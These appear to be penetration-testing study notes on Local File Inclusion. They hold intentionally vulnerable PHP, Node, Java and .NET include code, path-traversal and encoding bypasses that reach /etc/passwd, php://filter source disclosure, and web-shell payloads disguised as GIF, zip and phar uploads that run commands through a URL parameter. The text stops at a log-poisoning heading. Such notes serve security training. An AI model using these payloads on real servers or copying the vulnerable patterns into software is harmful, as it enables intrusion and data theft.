# Vulnerable code examples

## PHP
In `PHP`, we may use the `include()` function to load a local or a remote file as we load a page. If the `path` passed to the `include()` is taken from a user-controlled parameter, like a `GET` parameter, and `the code does not explicitly filter and sanitize the user input`, then the code becomes vulnerable to File Inclusion. The following code snippet shows an example of that:

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

## NodeJS
Just as the case with PHP, NodeJS web servers may also load content based on an HTTP parameters. The following is a basic example of how a GET parameter `language` is used to control what data is written to a page:

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

## Java
```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```


## .NET

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

# Basic Bypasses

## Non-Recursive Path Traversal Filters

One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (`../`) to avoid path traversals. For example:

```php
$language = str_replace('../', '', $_GET['language']);
```

We see that all `../` substrings were removed, which resulted in a final path being `./languages/etc/passwd`. However, this filter is very insecure, as it is not `recursively removing` the `../` substring, as it runs a single time on the input string and does not apply the filter on the output string. For example, if we use `....//` as our payload, then the filter would remove `../` and the output string would be `../`, which means we may still perform path traversal.
## Encoding

If the target web application did not allow `.` and `/` in our input, we can URL encode `../` into `%2e%2e%2f`, which may bypass the filter. Try double encoding it as well. 

## Approved Paths

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality. Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match. To bypass this, we may use path traversal and start our payload with the approved path, and then use `../` to go back to the root directory and read the file we specify, as follows:

```
index.php?language=./languages/../../../../etc/passwd
```

## Null Bytes

PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.
# PHP Filters
[PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`.

## Fuzzing for PHP files

```shell-session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

## Standard PHP Inclusion
```bash
http://<SERVER_IP>:<PORT>/index.php?language=config
```

```bash
php://filter/read=convert.base64-encode/resource=config

## Image Upload
#### Crafting Malicious Image
>[!NOTE]
>We are using a `GIF` image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type. The [File Upload Attacks](https://academy.hackthebox.com/module/details/136) module goes more in depth for file type attacks, and the same logic can be applied here.

```shell-session
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

#### Zip Upload
>[!NOTE]
> Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.

```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

#### PHAR Upload
Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:

```shell-session
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

## Log Poisoning

As was the case in the previous section, any of the following functions with `Execute` privileges should be vulnerable to these attacks:
